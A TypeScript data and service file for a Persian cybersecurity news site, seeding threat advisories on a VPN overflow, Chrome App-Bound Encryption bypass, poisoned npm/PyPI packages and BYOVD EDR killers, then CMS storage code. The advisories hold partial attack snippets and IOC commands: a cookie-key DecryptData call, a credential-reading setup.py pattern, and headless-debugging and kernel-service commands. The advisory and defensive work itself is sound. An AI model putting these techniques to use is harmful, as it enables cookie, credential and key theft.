          "ریشه این آسیب‌پذیری در تابعی قرار دارد که هدرهای طولانی X-Forwarded-For و کوکی‌های سفارشی وضعیت نشست را در پشته شبکه پارس می‌کند. به دلیل عدم بررسی صحیح مرز آرایه هنگام کپی کردن رشته ورودی به بافر تخصیص‌یافته روی Heap، مهاجم می‌تواند متادیتای بلوک حافظه مجاور را بازنویسی کند.",
          "با چیدمان دقیق اشیاء در حافظه (Heap Feng Shui)، مهاجمان موفق شده‌اند اشاره‌گر تابع بازگشتی را به سمت دستورالعمل اجرای شل هدایت کرده و یک وب‌شل مخفی را مستقیماً در حافظه پروسه وب‌سرور گیت‌وی تزریق نمایند."
        ],
        codeLanguage: "http",
        codeSnippet:
          "POST /remote/logincheck HTTP/1.1\nHost: vpn.target-enterprise.tld\nContent-Length: 18432\nCookie: SVPNCOOKIE=[OVERFLOW_PAYLOAD_4096_BYTES_WITH_ROP_CHAIN]\n\najax=1&username=admin"
      },
      {
        heading: "چرا صرفاً نصب پچ کافی نیست؟ خطر ماندگاری (Persistence) پس از نفوذ",
        paragraphs: [
          "تجربه حوادث مشابه نشان داده است که گروه‌های مهاجم پیش از انتشار عمومی وصله، کلیدهای خصوصی SSL گیت‌وی، هش رمزهای کش‌شده و توکن‌های LDAP/RADIUS را استخراج می‌کنند. بنابراین اگر سازمانی صرفاً دستگاه را آپدیت کند اما نشست‌ها و رمزها را باطل نسازد، مهاجم همچنان با حساب‌های معتبر دزدیده‌شده به شبکه داخلی دسترسی خواهد داشت."
        ],
        callout:
          "توصیه اکید تیم پاسخ به رخداد رهام: پس از نصب وصله امنیتی، حتماً تمامی سشن‌های فعال VPN را قطع (Revoke) کرده و رمز حساب سرویس اتصال به Active Directory را بازنشانی نمایید."
      }
    ],
    iocs: [
      {
        type: "File Path",
        value: "/var/tmp/.systemd-private-sock",
        description: "فایل سوکت مخفی ایجادشده توسط بک‌دور حافظه جهت حفظ دسترسی پس از ری‌استارت سرویس"
      },
      {
        type: "YARA/Rule",
        value: "rule APT_VPN_MemoryShell_2025 { strings: $s1 = \"SVPN_EXEC_HOOK\" condition: $s1 }",
        description: "قاعده YARA جهت اسکن حافظه پروسه‌های وب‌سرور درگاه VPN"
      }
    ],
    mitigationSteps: [
      "ارتقای فوری فرم‌ور درگاه‌های VPN و RDP به آخرین نسخه وصله‌شده اعلامی سازنده.",
      "غیرفعال کردن کامل دسترسی به پنل مدیریت ادمین (Management Interface) از روی شبکه عمومی اینترنت (WAN).",
      "باطل‌سازی (Revoke) تمامی سشن‌ها و توکن‌های صادرشده قبلی و چرخش کلیدهای گواهی TLS.",
      "بررسی لاگ‌های ارتباطی سرور LDAP/Active Directory برای شناسایی لاگین‌های مشکوک از مبدا IP داخلی گیت‌وی."
    ],
    timeline: [
      { time: "۳ مهر ۱۴۰۴", event: "ثبت اولین ترافیک مشکوک منجر به کرش سرویس در سنسورهای تله (Honeypot)" },
      { time: "۱۰ مهر ۱۴۰۴", event: "تایید اکسپلویت روز صفر و انتشار وصله اضطراری خارج از نوبت (Out-of-Band Patch)" },
      { time: "۱۲ مهر ۱۴۰۴", event: "انتشار تحلیل فنی و چک‌لیست پاک‌سازی توسط تیم رهام" }
    ],
    tags: ["Zero-Day", "RCE", "VPN Security", "Buffer Overflow", "APT", "Incident Response"]
  },
  {
    id: "news-03",
    slug: "chromium-app-bound-encryption-bypass-techniques-stealc-meduza",
    title: "تحلیل فنی: چگونه استیلرهای StealC و Meduza مکانیزم App-Bound Encryption کروم را دور می‌زنند؟",
    subtitle: "واکاوی رقابت تسلیحاتی میان مهندسان امنیت گوگل و توسعه‌دهندگان بدافزارهای سرقت کوکی بر سر کلیدهای رمزنگاری v20 در ویندوز",
    category: "malware",
    categoryLabel: "تحلیل بدافزار",
    severity: "HIGH",
    status: "published",
    isBreaking: false,
    date: "۷ مهر ۱۴۰۴ · ۱۱:۴۵",
    readTime: "۸ دقیقه",
    author: "آزمایشگاه مهندسی معکوس رهام",
    source: "Roham Malware Lab",
    views: 3120,
    cveIds: ["MITRE T1055", "MITRE T1134"],
    cvssScore: "8.4",
    affectedProducts: [
      "Google Chrome v127 - v130+",
      "Microsoft Edge & Brave Browsers on Windows"
    ],
    exploitStatus: "ماژول‌های اثبات مفهوم (PoC) در نسخه‌های جدید استیلرها رویت شده است",
    summary:
      "تنها چند هفته پس از معرفی مکانیزم محافظتی App-Bound Encryption در مرورگر کروم برای جلوگیری از سرقت کوکی‌ها، نویسندگان بدافزارهای StealC و Meduza با بهره‌گیری از تزریق کد به پروسه‌های مجاز و سوءاستفاده از رابط COM ویندوز، روش‌های جدیدی برای استخراج کلیدهای v20 پیاده‌سازی کرده‌اند.",
    keyHighlights: [
      "معرفی پیشوند رمزنگاری v20 در کروم ۱۲۷ که رمزگشایی کلید مستر را نیازمند سرویس سطح SYSTEM می‌کند.",
      "استفاده استیلرها از تکنیک اجرای مرورگر در حالت پس‌زمینه همراه با پورت دیباگ محلی (Remote Debugging Port).",
      "استفاده از تکنیک COM Elevation و تزریق شل‌کد به باینری‌های امضاشده در مسیر مجاز مرورگر."
    ],
    sections: [
      {
        heading: "مکانیزم IElevator و چالش تایید هویت پروسه فراخواننده در ویندوز",
        paragraphs: [
          "سرویس Chrome Elevation از یک رابط COM به نام IElevator استفاده می‌کند. زمانی که کروم می‌خواهد کلید اصلی کوکی‌ها را رمزگشایی کند، متد DecryptData را در این رابط COM صدا می‌زند. سرویس سطح SYSTEM بررسی می‌کند که آیا پروسه تماس‌گیرنده واقعاً فایل اجرایی کروم در مسیر Program Files است یا خیر.",
          "اما در سیستم‌عامل ویندوز، اگر یک بدافزار در سطح کاربر عادی بتواند کد خود را به درون فضای حافظه یک پروسه chrome.exe در حال اجرا تزریق کند (یا یک پروسه معلق chrome.exe بسازد و حافظه آن را تغییر دهد)، درخواست ارسالی به سرویس Elevation کاملاً از طرف مسیر معتبر کروم دیده می‌شود!"
        ],
        codeLanguage: "cpp",
        codeSnippet:
          "// نمای کلی فراخوانی رابط COM سرویس Elevation از درون پروسه تزریق‌شده:\nHRESULT hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&pElevator);\nif (SUCCEEDED(hr)) {\n    BSTR plaintextKey = nullptr;\n    DWORD lastError = 0;\n    hr = pElevator->DecryptData(bstrCiphertextV20, &plaintextKey, &lastError);\n}"
      }
    ],
    iocs: [
      {
        type: "Process/Command",
        value: "chrome.exe --headless --remote-debugging-port=9222 --user-data-dir=",
        description: "اجرای مخفی مرورگر با پورت دیباگ باز جهت تخلیه کوکی‌ها از طریق WebSocket"
      },
      {
        type: "Process/Command",
        value: "chrome.exe --Utility-sub-type=network.mojom.NetworkService",
        description: "ایجاد پروسه معلق کروم توسط پروسه‌های غیرمرتبط (مانند powershell یا rundll32)"
      }
    ],
    mitigationSteps: [
      "پایش ایجاد پروسه‌های chrome.exe یا msedge.exe که والد (Parent Process) آن‌ها cmd.exe، powershell.exe یا پروسه‌های ناشناس در پوشه AppData است.",
      "مسدودسازی آرگومان خط فرمان --remote-debugging-port در محیط‌های کاربری غیردولتی/غیرتوسعه.",
      "استفاده از محافظ‌های سطح کرنل و آنتی‌استیلر برای جلوگیری از باز شدن هندل حافظه (PROCESS_VM_WRITE) روی پروسه‌های مرورگر."
    ],
    timeline: [
      { time: "مرداد ۱۴۰۴", event: "انتشار رسمی کروم ۱۲۷ همراه با رمزنگاری App-Bound (پیشوند v20)" },
      { time: "شهریور ۱۴۰۴", event: "انتشار ابزارهای تحقیقاتی متن‌باز برای تست مقاومت سرویس IElevator" },
      { time: "مهر ۱۴۰۴", event: "ادغام ماژول‌های دور زدن v20 در نسخه‌های تجاری بدافزارهای StealC و Lumma" }
    ],
    tags: ["Chrome Security", "App-Bound Encryption", "StealC", "COM Elevation", "Browser Cookies"]
  },
  {
    id: "news-04",
    slug: "malicious-pypi-npm-packages-typosquatting-stealing-cloud-keys",
    title: "کشف کارزار گسترده پکیج‌های مسموم در مخازن npm و PyPI با هدف سرقت کلیدهای AWS، گیت‌هاب و فایل‌های .env",
    subtitle: "بیش از ۴۵ بسته مخرب با نام‌های مشابه کتابخانه‌های هوش مصنوعی و رمزنگاری، پیش از حذف شدن بیش از ۱۸ هزار بار توسط توسعه‌دهندگان دانلود شدند.",
    category: "cloud",
    categoryLabel: "امنیت ابری و زنجیره تامین",
    severity: "HIGH",
    status: "published",
    isBreaking: false,
    date: "۳ مهر ۱۴۰۴ · ۱۶:۱۰",
    readTime: "۵ دقیقه",
    author: "تیم امنیت زنجیره تامین و DevSecOps رهام",
    source: "Roham Supply-Chain Watch",
    views: 2430,
    cveIds: ["MITRE T1195.002"],
    cvssScore: "8.8",
    affectedProducts: [
      "Node.js / npm Ecosystem",
      "Python / PyPI Packages",
      "CI/CD Runners (GitHub Actions / GitLab CI)"
    ],
    exploitStatus: "بسته‌های شناسایی‌شده حذف شدند؛ خطر ماندگاری کلیدهای لو رفته",
    summary:
      "مهاجمان با انتشار ده‌ها پکیج ظاهراً کاربردی در حوزه اتصال به APIهای هوش مصنوعی و ابزارهای Web3، اسکریپت‌های لودر چندمرحله‌ای را در فایل‌های setup.py و postinstall جایگذاری کرده‌اند که به محض نصب، کلیدهای محیط ابری و توکن‌های گیت‌هاب توسعه‌دهنده را سرقت می‌کنند.",
    keyHighlights: [
      "سوءاستفاده از غلط‌های املایی رایج در نام کتابخانه‌های محبوب پایتون و جاوااسکریپت (Typosquatting).",
      "جستجوی خودکار تمام دایرکتوری‌های پروژه برای یافتن فایل‌های .env، .npmrc، ~/.aws/credentials و ~/.kube/config.",
      "ارسال اطلاعات سرقت‌شده از طریق تونل‌های رمزنگاری‌شده به بات‌های تلگرام و وب‌هوک‌های دیسکورد."
    ],
    sections: [
      {
        heading: "نحوه پنهان‌کاری کد مخرب در فایل‌های نصب پکیج",
        paragraphs: [
          "بررسی سورس‌کد پکیج‌های مسموم نشان می‌دهد که مهاجمان کد اصلی کتابخانه را دقیقاً از روی نسخه اصلی و معتبر کپی می‌کنند تا برنامه توسعه‌دهنده بدون هیچ خطایی کار کند و شکی برانگیخته نشود.",
          "تنها تفاوت در یک تابع کوچک درون اسکریپت نصب است که رشته‌ای رمزگذاری‌شده با XOR و Base64 را در حافظه دیکد کرده و یک پروسه پس‌زمینه جداگانه (Detached Process) ایجاد می‌کند تا حتی پس از اتمام دستور pip install به جمع‌آوری فایل‌های حساس ادامه دهد."
        ],
        codeLanguage: "python",
        codeSnippet:
          "# الگوی کشف‌شده در setup.py پکیج‌های مسموم (خلاصه‌شده):\nimport os, base64, urllib.request\n\ndef _ telemetry_init():\n    targets = [os.path.expanduser('~/.aws/credentials'), os.path.expanduser('~/.ssh/id_rsa'), '.env']\n    # خواندن فایل‌ها و ارسال در قالب هدر HTTP سفارشی"
      }
    ],
    iocs: [
      {
        type: "File Path",
        value: "~/.npmrc / ~/.pypirc / .env",
        description: "فایل‌های هدف اصلی که توسط اسکریپت postinstall خوانده می‌شوند"
      }
    ],
    mitigationSteps: [
      "قفل کردن نسخه دقیق وابستگی‌ها با استفاده از package-lock.json و فایل‌های requirements.txt دارای هش (--require-hashes).",
      "چرخش فوری (Rotate) تمامی کلیدهای AWS، توکن‌های GitHub و رمزهای دیتابیس در صورت نصب پکیج‌های مشکوک.",
      "اجرای پایپ‌لاین‌های بیلد در کانتینرهای بدون دسترسی به شبکه خارجی پس از مرحله کش وابستگی‌ها."
    ],
    timeline: [
      { time: "۱ مهر ۱۴۰۴", event: "آپلود خودکار ۴۵ پکیج با اکانت‌های یک‌بارمصرف در npm و PyPI" },
      { time: "۳ مهر ۱۴۰۴", event: "شناسایی رفتار شبکه غیرعادی در سندباکس تحلیل پکیج و حذف مخازن آلوده" }
    ],
    tags: ["Supply Chain", "npm", "PyPI", "Typosquatting", "DevSecOps", "Cloud Security"]
  },
  {
    id: "news-05",
    slug: "apt-ransomware-groups-abusing-edr-killers-byovd-drivers",
    title: "گزارش تحلیلی: استفاده گروه‌های باج‌افزاری و APT از درایورهای آسیب‌پذیر امضاشده (BYOVD) برای از کار انداختن EDRها",
    subtitle: "مهاجمان پس از ورود اولیه از طریق کوکی‌های سرقت‌شده، یک درایور کرنل قدیمی اما دارای امضای معتبر مایکروسافت را بارگذاری می‌کنند تا پروسه‌های امنیتی را در سطح Ring 0 متوقف سازند.",
    category: "apt",
    categoryLabel: "باج‌افزار و حملات APT",
    severity: "CRITICAL",
    status: "published",
    isBreaking: false,
    date: "۲۸ شهریور ۱۴۰۴ · ۱۰:۰۰",
    readTime: "۷ دقیقه",
    author: "گروه شکار تهدیدات پیشرفته (Threat Hunting) رهام",
    source: "Roham Threat Intelligence",
    views: 2980,
    cveIds: ["MITRE T1068", "MITRE T1562.001"],
    cvssScore: "9.1",
    affectedProducts: [
      "Windows Server 2016 / 2019 / 2022",
      "Windows 10 / 11 Enterprise Endpoints"
    ],
    exploitStatus: "مورد استفاده فعال در عملیات‌های باج‌افزاری سازمانی",
    summary:
      "در تکنیک Bring Your Own Vulnerable Driver (BYOVD)، مهاجم به جای نوشتن اکسپلویت برای کرنل ویندوز، یک درایور قانونی و امضاشده متعلق به نرم‌افزارهای سخت‌افزاری یا اورکلاک قدیمی را روی سیستم هدف نصب کرده و با سوءاستفاده از آسیب‌پذیری درون آن درایور، پروسه‌های آنتی‌ویروس و EDR را از سطح کرنل متوقف می‌کند.",
    keyHighlights: [
      "عبور کامل از سیاست Driver Signature Enforcement ویندوز به دلیل داشتن امضای دیجیتال معتبر روی درایور قدیمی.",
      "ارسال کدهای کنترلی IOCTL به درایور آسیب‌پذیر جهت حذف کال‌بک‌های کرنل (Kernel Callbacks) و بستن پروسه‌های محافظت‌شده (PPL).",
      "لزوم فعال‌سازی لیست سیاه درایورهای آسیب‌پذیر مایکروسافت (Vulnerable Driver Blocklist) و قابلیت HVCI."
    ],
    sections: [
      {
        heading: "مکانیزم حمله BYOVD: چرا ویندوز به درایور مهاجم اعتماد می‌کند؟",
        paragraphs: [
          "پروسه‌های امنیتی مدرن (EDR و آنتی‌ویروس‌ها) با مکانیزم Protected Process Light (PPL) محافظت می‌شوند؛ یعنی حتی کاربر Administrator هم نمی‌تواند از فضای کاربری (User Mode) آن‌ها را ببندد.",
          "برای عبور از این محدودیت، مهاجم باید وارد سطح کرنل (Ring 0) شود. از آنجا که ویندوز ۶۴ بیتی اجازه بارگذاری درایور بدون امضا را نمی‌دهد، مهاجم یک درایور ۵ سال پیشِ یک شرکت سخت‌افزاری معتبر را که امضای دیجیتال سالم دارد اما دارای باگ خواندن/نوشتن دلخواه در کرنل است، همراه بدافزار خود می‌آورد، آن را به عنوان سرویس ثبت کرده و از طریق آن، محافظت PPL پروسه EDR را در حافظه کرنل صفر می‌کند!"
        ]
      }
    ],
    iocs: [
      {
        type: "Process/Command",
        value: "sc.exe createSysDrv binPath= C:\\Windows\\Temp\\*.sys type= kernel",
        description: "ایجاد سرویس کرنل جدید از مسیرهای موقت و غیرمعمول"
      },
      {
        type: "File Path",
        value: "Event ID 7045 (Service Control Manager)",
        description: "ثبت رویداد بارگذاری سرویس درایور کرنل جدید در لاگ‌های سیستمی ویندوز"
      }
    ],
    mitigationSteps: [
      "فعال‌سازی قابلیت Memory Integrity (HVCI) و Microsoft Vulnerable Driver Blocklist در Windows Defender Application Control (WDAC).",
      "مانیتورینگ بلادرنگ رویدادهای Event ID 7045 و Sysmon Event ID 6 (Driver Loaded) در سامانه SIEM.",
      "اعمال اصل حداقل دسترسی (Least Privilege) و حذف دسترسی Local Admin از ایستگاه‌های کاری روزمره کارمندان."
    ],
    timeline: [
      { time: "شهریور ۱۴۰۴", event: "افزایش استفاده از ابزارهای Terminator و AuKill در نفوذهای شبکه" },
      { time: "۲۸ شهریور ۱۴۰۴", event: "بروزرسانی لیست هش درایورهای مسدودشده در پایگاه دانش رهام" }
    ],
    tags: ["BYOVD", "EDR Evasion", "Kernel Security", "Ransomware", "APT", "Blue Team"]
  }
];

const LOCAL_BLOG_KEY = "roham_cms_blog_posts_v2";
const LOCAL_NEWS_KEY = "roham_cms_news_articles_v2";

export function getLocalContentStore(): { blogPosts: BlogPost[]; newsArticles: NewsArticle[] } {
  if (typeof window === "undefined") {
    return { blogPosts: DEFAULT_BLOG_POSTS, newsArticles: DEFAULT_NEWS_ARTICLES };
  }
  let blogPosts = DEFAULT_BLOG_POSTS;
  let newsArticles = DEFAULT_NEWS_ARTICLES;
  try {
    const rawBlog = localStorage.getItem(LOCAL_BLOG_KEY);
    if (rawBlog) {
      const parsed = JSON.parse(rawBlog);
      if (Array.isArray(parsed) && parsed.length > 0) {
        blogPosts = parsed.map((b: BlogPost) => {
          // پاکسازی بخش‌های ساختگی قدیمی از پست‌های تولیدشده قبلی
          if (b.id?.startsWith("blog-") && b.content?.actionableTakeaways?.some((t) => t.includes("بروزرسانی فوری نسخه‌های آسیب‌پذیر به آخرین پچ امنیتی"))) {
            return {
              ...b,
              tldr: [],
              content: {
                ...b.content,
                conclusion: "",
                actionableTakeaways: [],
              },
            };
          }
          return b;
        });
      }
    } else {
      localStorage.setItem(LOCAL_BLOG_KEY, JSON.stringify(DEFAULT_BLOG_POSTS));
    }
  } catch {}

  try {
    const rawNews = localStorage.getItem(LOCAL_NEWS_KEY);
    if (rawNews) {
      const parsed = JSON.parse(rawNews);
      if (Array.isArray(parsed) && parsed.length > 0) {
        newsArticles = parsed.map((n: NewsArticle) => {
          // پاکسازی بخش‌های ساختگی قدیمی (IoC و چک‌لیست ساختگی) از خبرهای تولیدشده قبلی
          if (
            n.id?.startsWith("news-") &&
            (n.mitigationSteps?.some((m) => m.includes("بروزرسانی فوری نسخه‌های آسیب‌پذیر به آخرین پچ امنیتی")) ||
              n.iocs?.some((i) => i.value.includes("Observables & Signatures referenced") || i.value.includes("Check vendor security bulletin")))
          ) {
            return {
              ...n,
              keyHighlights: [],
              iocs: [],
              mitigationSteps: [],
              timeline: [],
            };
          }
          return n;
        });
      }
    } else {
      localStorage.setItem(LOCAL_NEWS_KEY, JSON.stringify(DEFAULT_NEWS_ARTICLES));
    }
  } catch {}

  return { blogPosts, newsArticles };
}

function saveLocalContentStore(blogPosts: BlogPost[], newsArticles: NewsArticle[]): void {
  if (typeof window === "undefined") return;
  try {
    localStorage.setItem(LOCAL_BLOG_KEY, JSON.stringify(blogPosts));
    localStorage.setItem(LOCAL_NEWS_KEY, JSON.stringify(newsArticles));
  } catch {}
}

async function callContentApi<T>(
  action: string,
  method: "GET" | "POST" = "POST",
  body?: unknown
): Promise<{ ok: boolean; status: number; data: T | null; isPhpAvailable: boolean }> {
  try {
    const headers: Record<string, string> = {
      Accept: "application/json",
    };
    const token = getStoredToken();
    if (token) {
      headers["Authorization"] = `Bearer ${token}`;
    }
    if (method === "POST") {
      headers["Content-Type"] = "application/json";
    }

    const res = await fetch(`/api/content.php?action=${encodeURIComponent(action)}`, {
      method,
      headers,
      body: method === "POST" && body ? JSON.stringify(body) : undefined,
      cache: "no-store",
    });

    const text = await res.text();
    if (text.trim().startsWith("<?php") || text.trim().startsWith("<!DOCTYPE")) {
      return { ok: false, status: res.status, data: null, isPhpAvailable: false };
    }

    const parsed = JSON.parse(text) as T;
    return { ok: res.ok, status: res.status, data: parsed, isPhpAvailable: true };
  } catch {
    return { ok: false, status: 0, data: null, isPhpAvailable: false };
  }
}

const LOCAL_CATEGORIES_KEY = "roham_local_categories_v1";

function getLocalCategories(): ContentCategory[] {
  if (typeof window === "undefined") return DEFAULT_CATEGORIES;
  try {
    const raw = localStorage.getItem(LOCAL_CATEGORIES_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch {}
  return DEFAULT_CATEGORIES;
}

function saveLocalCategories(categories: ContentCategory[]): void {
  if (typeof window === "undefined") return;
  try {
    localStorage.setItem(LOCAL_CATEGORIES_KEY, JSON.stringify(categories));
  } catch {}
}

/**
 * بارگذاری همزمان مقالات وبلاگ، اخبار امنیت و دسته‌بندی‌ها از دیتابیس MySQL هاست (یا حافظه محلی)
 */
export async function fetchContentStore(): Promise<{
  blogPosts: BlogPost[];
  newsArticles: NewsArticle[];
  categories: ContentCategory[];
  source: "mysql" | "local";
}> {
  const local = getLocalContentStore();
  const localCats = getLocalCategories();

  const res = await callContentApi<{
    ok?: boolean;
    blogPosts?: BlogPost[];
    newsArticles?: NewsArticle[];
    categories?: ContentCategory[];
    needsSeed?: boolean;
  }>("list", "GET");

  if (res.isPhpAvailable && res.ok && res.data) {
    const serverBlogs = Array.isArray(res.data.blogPosts) ? res.data.blogPosts : [];
    const serverNews = Array.isArray(res.data.newsArticles) ? res.data.newsArticles : [];
    const serverCats = Array.isArray(res.data.categories) ? res.data.categories : [];

    // نرمال‌سازی فیلد keywords
    const normalizedBlogs = (serverBlogs.length > 0 ? serverBlogs : local.blogPosts).map((b) => ({
      ...b,
      keywords: b.keywords && b.keywords.length > 0 ? b.keywords : b.tags || [],
    }));
    const normalizedNews = (serverNews.length > 0 ? serverNews : local.newsArticles).map((n) => ({
      ...n,
      keywords: n.keywords && n.keywords.length > 0 ? n.keywords : n.tags || [],
    }));
    const finalCats = serverCats.length > 0 ? serverCats : localCats;

    saveLocalContentStore(normalizedBlogs, normalizedNews);
    saveLocalCategories(finalCats);

    return {
      blogPosts: normalizedBlogs,
      newsArticles: normalizedNews,
      categories: finalCats,
      source: "mysql",
    };
  }

  // حالت لوکال
  const normalizedBlogs = local.blogPosts.map((b) => ({
    ...b,
    keywords: b.keywords && b.keywords.length > 0 ? b.keywords : b.tags || [],
  }));
  const normalizedNews = local.newsArticles.map((n) => ({
    ...n,
    keywords: n.keywords && n.keywords.length > 0 ? n.keywords : n.tags || [],
  }));

  return {
    blogPosts: normalizedBlogs,
    newsArticles: normalizedNews,
    categories: localCats,
    source: "local",
  };
}

export async function adminSaveCategory(category: ContentCategory): Promise<{
  ok: boolean;
  message: string;
  error?: string;
  categories: ContentCategory[];
}> {
  const localCats = getLocalCategories();
  const updatedList = [...localCats];
  const existsIdx = updatedList.findIndex((c) => c.id === category.id || c.slug === category.slug);
  if (existsIdx >= 0) {
    updatedList[existsIdx] = category;
  } else {
    updatedList.push(category);
  }
  saveLocalCategories(updatedList);

  const res = await callContentApi<{ ok?: boolean; message?: string; error?: string }>("save_category", "POST", {
    category,
  });

  if (res.isPhpAvailable && !res.ok) {
    const errMsg = res.data?.error || "خطا در ذخیره دسته‌بندی در دیتابیس";
    return { ok: false, message: errMsg, error: errMsg, categories: updatedList };
  }

  return {
    ok: true,
    message: res.data?.message || "دسته‌بندی با موفقیت ذخیره شد.",
    categories: updatedList,
  };
}

export async function adminDeleteCategory(categoryId: string): Promise<{
  ok: boolean;
  message: string;
  categories: ContentCategory[];
}> {
  const localCats = getLocalCategories();
  const updatedList = localCats.filter((c) => c.id !== categoryId);
  saveLocalCategories(updatedList);

  await callContentApi("delete_category", "POST", { id: categoryId });
  return {
    ok: true,
    message: "دسته‌بندی حذف شد.",
    categories: updatedList,
  };
}

export async function incrementContentView(contentType: "blog" | "news", id: string): Promise<void> {
  const local = getLocalContentStore();
  if (contentType === "blog") {
    const updated = local.blogPosts.map((p) => (p.id === id ? { ...p, views: (p.views || 0) + 1 } : p));
    saveLocalContentStore(updated, local.newsArticles);
  } else {
    const updated = local.newsArticles.map((n) => (n.id === id ? { ...n, views: (n.views || 0) + 1 } : n));
    saveLocalContentStore(local.blogPosts, updated);
  }
  await callContentApi("view", "POST", { contentType, id });
}

export async function adminSaveBlogPost(post: BlogPost): Promise<{
  ok: boolean;
  message: string;
  error?: string;
  blogPosts: BlogPost[];
}> {
  const local = getLocalContentStore();
  let updatedList = [...local.blogPosts];
  if (post.isFeatured) {
    updatedList = updatedList.map((p) => (p.id === post.id ? p : { ...p, isFeatured: false }));
  }
  const existsIdx = updatedList.findIndex((p) => p.id === post.id);
  if (existsIdx >= 0) {
    updatedList[existsIdx] = post;
  } else {
    updatedList.unshift(post);
  }
  saveLocalContentStore(updatedList, local.newsArticles);

  const res = await callContentApi<{ ok?: boolean; message?: string; error?: string }>("save_blog", "POST", {
    post,
  });

  if (res.isPhpAvailable && !res.ok) {
    const errMsg = res.data?.error || "خطا در ذخیره مقاله در دیتابیس";
    return { ok: false, message: errMsg, error: errMsg, blogPosts: updatedList };
  }

  return {
    ok: true,
    message: res.data?.message || "مقاله وبلاگ با موفقیت در دیتابیس ذخیره و منتشر شد.",
    blogPosts: updatedList,
  };
}

export async function adminDeleteBlogPost(postId: string): Promise<{
  ok: boolean;
  message: string;
  blogPosts: BlogPost[];
}> {
  const local = getLocalContentStore();
  const updatedList = local.blogPosts.filter((p) => p.id !== postId);
  saveLocalContentStore(updatedList, local.newsArticles);

  await callContentApi("delete_blog", "POST", { id: postId });
  return {
    ok: true,
    message: "مقاله وبلاگ حذف شد.",
    blogPosts: updatedList,
  };
}

export async function adminSaveNewsArticle(article: NewsArticle): Promise<{
  ok: boolean;
  message: string;
  error?: string;
  newsArticles: NewsArticle[];
}> {
  const local = getLocalContentStore();
  const updatedList = [...local.newsArticles];
  const existsIdx = updatedList.findIndex((n) => n.id === article.id);
  if (existsIdx >= 0) {
    updatedList[existsIdx] = article;
  } else {
    updatedList.unshift(article);
  }
  saveLocalContentStore(local.blogPosts, updatedList);

  const res = await callContentApi<{ ok?: boolean; message?: string; error?: string }>("save_news", "POST", {
    article,
  });

  if (res.isPhpAvailable && !res.ok) {
    const errMsg = res.data?.error || "خطا در ذخیره خبر در دیتابیس";
    return { ok: false, message: errMsg, error: errMsg, newsArticles: updatedList };
  }

  return {
    ok: true,
    message: res.data?.message || "خبر / هشدار امنیتی با موفقیت در دیتابیس ذخیره شد.",
    newsArticles: updatedList,
  };
}

export async function adminDeleteNewsArticle(articleId: string): Promise<{
  ok: boolean;
  message: string;
  newsArticles: NewsArticle[];
}> {
  const local = getLocalContentStore();
  const updatedList = local.newsArticles.filter((n) => n.id !== articleId);
  saveLocalContentStore(local.blogPosts, updatedList);

  await callContentApi("delete_news", "POST", { id: articleId });
  return {
    ok: true,
    message: "گزارش خبری حذف شد.",
    newsArticles: updatedList,
  };
}

export async function adminResetDefaultContent(): Promise<{
  ok: boolean;
  message: string;
  blogPosts: BlogPost[];
  newsArticles: NewsArticle[];
}> {
  saveLocalContentStore(DEFAULT_BLOG_POSTS, DEFAULT_NEWS_ARTICLES);
  await callContentApi("reset_defaults", "POST", {
    blogPosts: DEFAULT_BLOG_POSTS,
    newsArticles: DEFAULT_NEWS_ARTICLES,
  });
  return {
    ok: true,
    message: "مقالات و اخبار پیش‌فرض با موفقیت بازنشانی شدند.",
    blogPosts: DEFAULT_BLOG_POSTS,
    newsArticles: DEFAULT_NEWS_ARTICLES,
  };
}

export const saveBlogPostToStore = adminSaveBlogPost;
export const deleteBlogPostFromStore = adminDeleteBlogPost;
export const saveNewsArticleToStore = adminSaveNewsArticle;
export const deleteNewsArticleFromStore = adminDeleteNewsArticle;
export const resetContentStoreToDefaults = adminResetDefaultContent;

// ============================================================================
// SMART DUAL-MODEL AI AUTO-PUBLISHER & MEDIA PIPELINE
// ============================================================================

export interface AiModelNodeConfig {
  provider: "google_gemini" | "openai_compatible";
  baseUrl: string;
  modelName: string;
  envKeyName: string;
  temperature: number;
  maxTokens: number;
  roleDescription: string;
  customInstructions?: string;
}

export interface AiPipelineConfig {
  lightModel: AiModelNodeConfig;
  strongModel: AiModelNodeConfig;
  mediaConfig: {
    uploadFolder: string;
    downloadImages: boolean;
    maxImagesPerPost: number;
    organizeByMonth: boolean;
  };
  updatedAt?: string;
}

export const DEFAULT_AI_PIPELINE_CONFIG: AiPipelineConfig = {
  lightModel: {
    provider: "google_gemini",
    baseUrl: "https://generativelanguage.googleapis.com/v1beta",
    modelName: "gemini-3-flash-preview",
    envKeyName: "GEMINI_API_KEY",
    temperature: 0.1,
    maxTokens: 4096,
    roleDescription: "پالایشگر سریع DOM، حذف هدر/فوتر و استخراج‌کننده ساختار خام و لینک تصاویر",
  },
  strongModel: {
    provider: "google_gemini",
    baseUrl: "https://generativelanguage.googleapis.com/v1beta",
    modelName: "gemini-3.1-pro-preview",
    envKeyName: "GEMINI_API_KEY",
    temperature: 0.3,
    maxTokens: 8192,
    roleDescription: "مترجم تخصصی امنیت سایبری، تحلیلگر CVE/IoC و معمار ساختار استاندارد خبر و وبلاگ",
    customInstructions:
      "ترجمه باید کاملاً روان، تخصصی و وفادار به ادبیات فنی امنیت سایبری (حفظ اصطلاحات کلیدی مانند Zero-Day, RCE, DPAPI, C2 در کنار معادل فارسی) باشد.",
  },
  mediaConfig: {
    uploadFolder: "uploads/media",
    downloadImages: true,
    maxImagesPerPost: 10,
    organizeByMonth: true,
  },
};

const AI_CONFIG_STORAGE_KEY = "roham_ai_pipeline_config_v1";

export async function fetchAiPipelineConfig(): Promise<{
  config: AiPipelineConfig;
  serverStatus: {
    lightKeyReady: boolean;
    strongKeyReady: boolean;
    uploadDirWritable: boolean;
  };
}> {
  let localConfig = DEFAULT_AI_PIPELINE_CONFIG;
  if (typeof window !== "undefined") {
    try {
      const saved = localStorage.getItem(AI_CONFIG_STORAGE_KEY);
      if (saved) {
        localConfig = { ...DEFAULT_AI_PIPELINE_CONFIG, ...JSON.parse(saved) };
      }
    } catch {}
  }

  try {
    const token = getStoredToken();
    const res = await fetch("/api/auto-publisher.php?action=get_config", {
      headers: token ? { Authorization: `Bearer ${token}` } : {},
    });
    const text = await res.text();
    if (!text.trim().startsWith("<?php") && !text.trim().startsWith("<!DOCTYPE")) {
      const data = JSON.parse(text);
      if (data && data.ok && data.config) {
        if (typeof window !== "undefined") {
